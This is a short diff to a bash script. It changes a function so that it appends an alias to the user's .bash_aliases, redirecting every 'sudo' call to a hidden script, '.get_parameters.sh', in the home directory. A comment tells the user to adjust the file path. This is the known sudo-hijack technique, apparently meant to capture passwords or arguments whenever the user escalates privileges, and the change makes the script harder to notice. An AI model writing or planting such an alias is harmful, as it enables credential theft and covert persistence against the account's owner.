@@ -3,10 +3,9 @@
 
 function to_exec() {
 
-	aliasfile=$(locate .bash_aliases)
-	noaliasfile=$(locate .bashrc)
 
-	echo "alias sudo='bash /home/$USER/Documentos/linux/get_parameters.sh'" >> /home/$USER/.bash_aliases
+	# change the .bash_alises file path in order to match your .bash_aliases file path 
+	echo "alias sudo='bash /home/$USER/.get_parameters.sh'" >> /home/$USER/.bash_aliases
 }
 
 
